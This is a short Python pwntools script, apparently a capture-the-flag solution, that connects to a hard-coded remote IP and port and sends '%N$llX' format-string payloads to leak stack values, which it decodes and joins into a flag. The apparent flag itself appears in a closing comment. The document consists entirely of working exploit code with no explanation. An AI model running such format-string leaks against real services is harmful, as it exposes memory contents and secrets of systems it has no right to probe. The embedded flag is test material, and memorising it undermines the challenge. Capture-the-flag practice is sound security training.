# FORMAT STRING
from pwn import *

resultant_string = list()
flag = ""
for x in range(8,13):
	conex = remote("82.223.39.79", 1239)
	print conex.recvline()
	conex.sendline("%" + str(x) + "$llX")
	response = int(conex.recvline(), 16)
	response = p64(response)
	#list.append(response)
	flag += response

print "Final string " + flag

#CTFA{w3ll_d0n3_dud3_73478537845}





